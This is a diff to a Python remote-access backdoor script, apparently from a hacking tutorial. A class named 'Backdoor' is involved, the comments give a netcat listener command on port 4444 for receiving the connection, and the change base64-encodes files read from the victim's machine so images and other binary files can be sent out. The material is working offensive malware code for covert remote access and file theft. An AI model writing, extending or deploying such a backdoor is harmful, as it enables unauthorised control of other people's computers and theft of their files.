@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
 
-import json, os, socket, subprocess
+import base64, json, os, socket, subprocess
 
 #to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
@@ -21,7 +21,8 @@ class Backdoor:
     
     def read_file(self, path):
         with open(path, "rb") as file: #rb - open file for reading as binary
-            return file.read()
+            return base64.b64encode(file.read()) #use base-64 file encoding
+            #to be able to handle non-text files (images etc)
     
     def reliable_receive(self):
         json_data = ""
